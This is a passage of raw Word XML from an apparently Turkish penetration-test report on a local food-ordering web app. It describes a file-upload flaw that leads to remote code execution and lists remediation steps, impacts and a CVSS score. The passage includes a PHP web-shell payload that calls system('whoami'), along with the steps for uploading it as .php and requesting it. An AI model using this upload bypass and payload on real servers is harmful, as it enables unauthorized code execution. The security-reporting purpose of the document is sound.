                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70EE29EC" wp14:editId="7BCB343F">
                  <wp:extent cx="5713730" cy="3277235"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="0"/>
                  <wp:docPr id="195584330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843304" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId26"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="3277235"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="68A8B88B" w14:textId="4474325A" w:rsidR="004E6D77" w:rsidRPr="00C361DB" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidR="00CD5762">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Dosya Yükleme İsteği</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BBC9E77" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7E17F945" w14:textId="439D31EF" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Dosya uzantısı .php ile değiştirilir ve </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>Content-Disposition: form-data; name="update_profile_picture"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Header’ının altına </w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>“&lt;?php $value = system("</w:t>
            </w:r>
            <w:r>
              <w:t>whoami</w:t>
            </w:r>
            <w:r w:rsidRPr="00CF0A67">
              <w:t>");  echo $value; ?&gt;</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">bu payload yazılır. Ardından istek gönderilir. Sistemden çıkış yapılır ve </w:t>
            </w:r>
            <w:hyperlink r:id="rId27" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> müşteri</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId28" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/customer_food_search.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilip seçilen restauran’ın &lt;img&gt; etiketi içinde </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> yüklenen dosyanın konumu bulunur. Bulunan konuma (</w:t>
            </w:r>
            <w:hyperlink r:id="rId29" w:history="1">
              <w:r w:rsidRPr="004E2517">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/uploads/food_images/66ffc9e65e6d4_test.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>) istek atılır. Böyle başarıyla sunucu üzerinde uzaktan kod yürütülür.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78C2B530" w14:textId="3E0891A1" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E6D77">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69C7B2F0" wp14:editId="2D289F25">
                  <wp:extent cx="5713730" cy="928370"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="5080"/>
                  <wp:docPr id="179222928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229285" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId30"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="928370"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="60ADECA5" w14:textId="2C4980FE" w:rsidR="004E6D77" w:rsidRPr="00CF0A67" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Görsel -  </w:t>
            </w:r>
            <w:r w:rsidR="00DE4483">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="00CD5762" w:rsidRPr="00C361DB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Elde </w:t>
            </w:r>
            <w:r w:rsidR="00CD5762">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Edilen Komutun Response’u</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00057867" w14:paraId="32BC7279" w14:textId="77777777" w:rsidTr="00C20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70E8EC41" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00057867" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00D60321" w14:paraId="5699890E" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="0280655A" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">  Dosya Türü Kontrolü:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12BCD58F" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="11"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklemeye izin verilen dosya türlerini sınırlayın. Sadece belirli dosya türlerine (örneğin, .jpg, .png, .pdf) izin verin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71599AB4" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="11"/>
              </w:numPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Dosya uzantılarını kontrol etmek yeterli değildir; dosya içeriğini de doğrulamak için MIME türü kontrolü yapın</w:t>
            </w:r>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1590CE60" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t xml:space="preserve"> Dosya Boyutu Sınırlaması:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F49EA66" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="12"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklenen dosyaların boyutunu sınırlayın. Belirli bir boyutun üzerinde dosya yüklemeyi engelleyin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01B24DBC" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:t>Dosya İsimleri Kontrolü:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="305CD062" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Yüklenen dosyaların isimlerini güvenli hale getirin. Dosya isimlerindeki özel karakterleri temizleyin ve dosya isimlerini standart bir formatta düzenleyin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73B30416" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00BF4DE0" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00BF4DE0">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Aynı dosya ismi ile yüklenmeleri durumunda yeni isimler verin.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35B0B196" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00402B96" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w14:paraId="36DCF50A" w14:textId="77777777" w:rsidTr="00C20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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B2BB573" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w14:paraId="57A6479B" w14:textId="77777777" w:rsidTr="00C20FA7">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="55B14890" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="15"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Tam Kontrol: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde tam kontrol sağlayabilir. Bu, dosya sistemine erişim, sistem ayarlarını değiştirme ve yazılımları yükleme veya kaldırma anlamına gelir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D39A48B" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="776A0F02" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Veri Hırsızlığı: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>RCE zafiyeti sayesinde, saldırgan hassas verilere (şifreler, kişisel bilgiler, finansal veriler vb.) erişebilir ve bunları çalabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3ACEA781" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="24FCC95F" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Zarar Verme: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde kötü amaçlı yazılımlar, virüsler veya truva atları yükleyerek sistemin işleyişini bozabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10C5FC42" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="166B330A" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Ağ İçin Tehdit: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Hedef sistemin yanı sıra, RCE zafiyetleri, diğer bağlı sistemlere (ağdaki diğer cihazlar, sunucular vb.) de zarar verebilir veya erişim sağlayabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2991CFEA" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="59E21035" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5094B70A" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Veri Bütünlüğünün İhlali:</w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve"> Saldırgan, verileri değiştirebilir veya silebilir, bu da veri bütünlüğünü ciddi şekilde etkileyebilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="743EE926" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="2C8353F0" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Hizmet Durdurma: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, sistem kaynaklarını aşırı şekilde kullanarak hedef sistemin hizmet dışı kalmasına neden olabilir (DoS/DDoS saldırıları).</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4537DEDA" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="0B6D21AC" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00991F03" w:rsidRDefault="004E6D77" w:rsidP="00994536">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t xml:space="preserve">Sistem İzleme: </w:t>
            </w:r>
            <w:r w:rsidRPr="00991F03">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="000000" w:themeColor="text1"/>
              </w:rPr>
              <w:t>Saldırgan, hedef sistemde gizlice izleme yaparak kullanıcıların etkinliklerini gözlemleyebilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74B17A1B" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00402B96" w14:paraId="61DBE6EB" w14:textId="77777777" w:rsidTr="00C20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2115F16F" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00402B96" w14:paraId="6AFEB8D1" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="4C36BD08" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00C361DB" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>7.2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004E6D77" w:rsidRPr="00402B96" w14:paraId="61C7386E" w14:textId="77777777" w:rsidTr="00C20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49050CC2" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="00402B96" w:rsidRDefault="004E6D77" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5741A4B3" w14:textId="77777777" w:rsidR="004E6D77" w:rsidRPr="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="004E6D77"/>
    <w:p w14:paraId="36934AC3" w14:textId="7579A6B2" w:rsidR="004E6D77" w:rsidRDefault="004E6D77" w:rsidP="004E6D77">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>5 ) Remote Code Execution</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
